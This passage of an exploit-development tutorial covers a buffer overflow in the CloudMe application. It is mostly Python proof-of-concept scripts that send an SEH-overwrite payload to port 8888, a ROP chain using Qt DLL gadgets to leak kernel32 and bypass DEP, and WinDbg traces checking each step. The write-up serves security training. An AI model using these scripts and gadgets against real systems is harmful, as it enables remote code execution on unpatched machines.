pattern+="h6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0C" 
pattern+="k1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5C" 
pattern+="m6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0C" 
pattern+="p1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5C" 
pattern+="r6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0C" 
pattern+="u1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5C" 
pattern+="w6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0C" 
pattern+="z1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5D" 
pattern+="b6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0D" 
pattern+="e1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5D" 
pattern+="g6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0D" 
pattern+="j1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5D" 
pattern+="l6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0D" 
pattern+="o1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5D" 
pattern+="q6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0D" 
pattern+="t1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5D" 
pattern+="v6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0D" 
pattern+="y1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5E" 
pattern+="a6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0E" 
pattern+="d1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5E" 
pattern+="f6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0E" 
pattern+="i1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5E" 
pattern+="k6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0E" 
pattern+="n1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5E" 
pattern+="p6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0E" 
pattern+="s1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5E" 
pattern+="u6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0E" 
pattern+="x1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5E" 
pattern+="z6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0F" 
pattern+="c1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5F" 
pattern+="e6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0F" 
pattern+="h1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5F" 
pattern+="j6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0F" 
pattern+="m1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5F" 
pattern+="o6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0F" 
pattern+="r1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5F" 
pattern+="t6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0F" 
pattern+="w1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5F" 
pattern+="y6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0G" 
pattern+="b1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5G" 
pattern+="d6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0G" 
pattern+="g1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5G" 
pattern+="i6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk" 

payload = pattern[:2236] 

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN 

payload = payload + seh 

try: 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.connect((target,8888)) s.send(payload) 
except Exception as e: 
 print(sys.exc_value)

```

<p align="justify">
Now lets put a breakpoint at the address <b>0x6998fb2e</b>
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bp 0x6998fb2e 
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
0:000> bl 
0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
</pre>

<p align="justify">
Furthermore, lets observe the crash below. As we see, we are stepping into every instruction after we hit the first breakpoint. Then, when we reach the last gadget, we check the <b>ESP</b> register once again in order to see if we have made the right calculations.
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
6998fb2e 81c46c070000 add esp,76Ch
0:000> t
eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
6998fb34 5b pop ebx
0:000> 
eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
6998fb35 5e pop esi
0:000> 
eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=00000000
eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
6998fb36 5f pop edi
0:000> 
eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243
eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
6998fb37 5d pop ebp
0:000> 
eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243
eip=6998fb38 esp=0022d694 ebp=62433362 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
6998fb38 c3 ret
0:000> dd esp
0022d694 35624334 43366243 62433762 39624338
0022d6a4 43306343 63433163 33634332 43346343
0022d6b4 63433563 37634336 43386343 64433963
0022d6c4 31644330 43326443 64433364 35644334
0022d6d4 43366443 64433764 39644338 43306543
0022d6e4 65433165 33654332 43346543 65433565
0022d6f4 37654336 43386543 66433965 31664330
0022d704 43326643 66433366 35664334 43366643
</pre>

<p align="justify">
As we see, the <b>ESP</b> register points to <b>0x0022d694</b> which contains the pattern <b>35624334</b> (offset <b>0x224</b> from the beginning of the payload) ,which is expected considering we are jumping extra <b>548</b> bytes from the beginning of the payload ( <b>1916 - 1368</b> ).
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> ? 0022d694 - 0022d470
Evaluate expression: 548 = 00000224
0:000> ? 0022d484 - esp
Evaluate expression: 0 = 00000000
</pre>

<p align="justify">
At this point we are confident that we are moving in the right way. Furthermore, we should create another proof of concept script in order to see that we have full control when performing our stack pivot. All we want now is to find our landing location where we will put our <b>ROP</b> chain to bypass <b>DEP</b> protection.
</p>


```python
import struct
import socket
import sys

target = "127.0.0.1"

junk1 = "A"*1604 

rop = "BBBB"  # placeholder. Here will be the start of our ROP chain

junk2 = "C"*(2236 - len(rop) - len(junk1))

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN  

payload = junk1 + rop + junk2 + seh 

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(payload)
except Exception as e:
    print(sys.exc_value)
```

<p align="justify">
Below is the debugging <b>WinDbg</b> session corresponding to the PoC exploit above, that proves the successful pivoting
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:016> bp 0x6998fb2e
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
0:016> bl
0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
0:016> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
6998fb2e 81c46c070000 add esp,76Ch
0:000> t
eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
6998fb34 5b pop ebx
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
6998fb35 5e pop esi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=00000000
eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
6998fb36 5f pop edi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
6998fb37 5d pop ebp
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
6998fb38 c3 ret
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
eip=42424242 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
42424242 ?? ???
</pre>

<p align="justify">
As we see above, we have landed precisely into our placeholder at <b>"BBBBB"</b>. At this point we are ready to start building the ROP chain to bypass DEP, but before doing this we will search for gadgets to dynamically load the address of <b>VirtualProtect</b> function.
</p>


* * *

### 5. Leaking the Kernel32 address


<p align="justify">
In order to make this exploit persistent and workable across multiple Windows platforms, we need to find a way to bypass address randomization and dynamically load the address of <b>VirtualProtect</b> function. In order to accomplish this task we will try to call <b>VirtualProtect</b> by extracting a leaked <b>kernel32</b> address found on the stack and using it as a point of reference in order to calculate the desired address. First let’s find the location of the leaked memory address. We will open <b>Immunity Debugger</b> and attach the <b>CloudMe</b> process. Then we will run the previous python script in order to crash the program and trigger the exception.

Afterwards we will scroll down in stack view at <b>Immunity Debugger</b>. Further down the stack view, we should start seeing pointers on the stack, indicating " <b>RETURN to … from …</b>". These are saved addresses placed on the stack by functions that were called earlier. If we scroll almost all the way down, we will find a pointer to a <b>kernel32</b> address.
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-16-at-15.22.54.png" alt=""/>

<p align="justify">
As previously mentioned, after scrolling down the stack view, there is a leaked <b>kernel32</b> address <b>0x0022ED28</b>
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0022ED28 |75C44543 CEÄu kernel32.GetFullPathNameW
</pre>

We can confirm that this address is referring at a **kernel32** function by using the following command

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> dds 
0022ED28 0022ed28 75c44543 kernel32!GetFullPathNameWStub [...]
</pre>

At this point, we need to figure out how to:

- Load the stack address (ESP or EBP) into a register (e.g EAX)
- Advance that register to the stack memory location with the leaked **kernel32** address
- Put the leaked **kernel32** address into the register.

Before proceeding any further, let’s find all suitable ROP gadgets using **mona.py** as follows:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !load pykd.pyd
0:000> !py mona rop -n -o 
[...]
</pre>

<p align="justify">
After a while we open <b>rop_suggestions.txt</b> and <b>rop.txt</b> in mona’s output directory ( <b>WinDbg</b> Debugger’s program folder). First let’s figure out a way to get the current stack address into <b>EAX</b> register. <b>EAX</b> is the register of choice because there are available gadgets of the following instruction <b>MOV EAX,DWORD PTR [EAX]</b> which will allow us to load the <b>kernel32</b> address into <b>EAX</b>. Before searching for suitable gadgets, we must also refer to the Module info inside the <b>rop_suggestions.txt</b> file in order to check which <b>.dll</b> has no restrictions. We found that the following <b>.dlls</b> have no restrictions
</p>

- [Qt5Network.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll)
- [Qt5Core.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll)
- [libstdc++-6.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll)
- [libgcc\_s\_dw2-1.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libgcc\_s\_dw2-1.dll)
- [libwinpthread-1.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll)
- [Qt5Gui.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll)
- [Qt5Xml.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll)
- [qsqlite.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\sqldrivers\qsqlite.dll)
- [Qt5Sql.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll)


<p align="justify">
As we see above, there are many modules that we could search for gadgets. Afterwards, the following gadgets have been found and used in order to load the <b>Kernel32</b> address into the EAX register.
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0x699012c9 # POP EBP # RETN [Qt5Network.dll]
0x0385FF88 # Offset
0x68a9559e # XCHG EAX,EBP # RETN [Qt5Core.dll]
0x68ae4fe3 # POP ECX # RETN [Qt5Core.dll]
0x0362fffc # Offset
0x68ad422b # SUB EAX,ECX # RETN [Qt5Core.dll]
0x68ae8a22 # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
</pre>


<p align="justify">
Now lets explain what we see above. At the first gadget we put the hex value <b>0x0385ff88</b> into the <b>EBP</b> register. Then, <b>EAX</b> register will get that offset as seen at the second gadget. Afterwards , <b>ECX</b> register will load the hex value <b>0x0362fffc</b>. Now at the sixth gadget above we subtract the two values and with this technique we get the following address on the stack&nbsp; <b>0x0022FF8C</b>. If we scroll down at the stack pane in <b>Immunity Debugger</b> we will see that this address is referring to a leaked <b>Kernel32</b> address.&nbsp; Before we move further, we must load the leaked <b>kernel32</b> address into EAX by using the gadget <b>MOV EAX,DWORD PTR [EAX]</b>.&nbsp;&nbsp;

In order to see this in practice lets create the following PoC script
</p>


```python
import struct
import socket
import sys

target = "127.0.0.1"

payload_size = 1604

junk1 = "\x41" * payload_size

########################################################################

# Get kernel32 address from the stack
# 762a20d8 kernel32!VirtualProtect

rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
rop+= struct.pack('L',0x0385FF88) # Offset
rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x0362fffc) # Offset
rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]

########################################################################

buf = "\x42" * 351

nops = "\x90" * 16

junk2 = "\x43"*(2236 - len(rop) - len(nops) - len(buf) - len(junk1))

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN

payload = junk1 + rop + nops + buf + junk2 + seh

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,8888))
  s.send(payload)
except Exception as e:
  print(sys.exc_value)
```

<p align="justify">
Below is the debugging session with <b>WinDbg</b> which shows the ROP gadgets in action:
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bp 0x6998fb2e
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
0:000> bl
0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
6998fb2e 81c46c070000 add esp,76Ch
0:000> t
eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
6998fb34 5b pop ebx
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
6998fb35 5e pop esi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000
eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
6998fb36 5f pop edi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
6998fb37 5d pop ebp
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
6998fb38 c3 ret
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network+0x12c9:
699012c9 5d pop ebp
0:000> 
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network+0x12ca:
699012ca c3 ret
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!Z21qt_logging_to_consolev+0x8e:
68a9559e 95 xchg eax,ebp
0:000> 
eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!Z21qt_logging_to_consolev+0x8f:
68a9559f c3 ret
0:000> 
